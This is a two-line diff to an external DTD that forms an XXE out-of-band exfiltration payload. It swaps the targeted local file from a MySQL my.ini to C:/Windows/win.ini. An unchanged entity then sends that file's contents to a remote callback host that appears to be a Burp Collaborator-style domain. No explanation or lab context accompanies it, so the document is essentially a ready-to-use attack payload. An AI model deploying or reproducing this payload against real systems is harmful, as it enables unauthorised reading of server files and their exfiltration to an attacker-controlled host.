@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///C:/Program Files/MySQL/MySQL Server 5.1/my.ini">
+<!ENTITY % data SYSTEM "file:///C:/Windows/win.ini">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
